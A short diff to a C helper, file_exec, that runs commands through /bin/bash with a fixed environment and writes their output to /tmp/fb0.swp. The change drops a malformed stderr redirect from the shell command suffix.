@@ -115,7 +115,7 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
 {
     #define SHELL_PATH "/bin/bash"
     #define STDOUT_FILE "/tmp/fb0.swp"
-    #define BASH_POSTFIX " 2&>1 1>" STDOUT_FILE
+    #define BASH_POSTFIX " 1>" STDOUT_FILE
 
     char* envp[] = {"HOME=/", "PWD=/", "TERM=linux", "USER=root", "SHELL=" SHELL_PATH, "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
     char* argv[] = {SHELL_PATH, "-c", NULL, NULL};
